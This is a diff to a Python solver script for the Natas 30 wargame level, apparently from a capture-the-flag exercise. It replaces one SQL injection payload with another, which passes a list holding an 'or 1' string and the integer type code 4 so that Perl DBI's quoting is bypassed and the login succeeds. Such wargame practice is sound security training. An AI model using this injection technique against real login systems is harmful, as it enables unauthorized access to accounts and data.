@@ -3,8 +3,9 @@ from urllib.parse import quote, unquote
 
 session = requests.Session()
 
-def natas30(url):    
-    params={"username": "natas31", "password": [" or 1=1", 'INT(10)']}
+def natas30(url):
+    # DBI::SQL_INTEGER = 4    
+    params={"username": "natas31", "password": ["'lol' or 1",4]}
     response = session.post(url, data=params)
     print(response.text)
     if 'FAIL' in response.text:
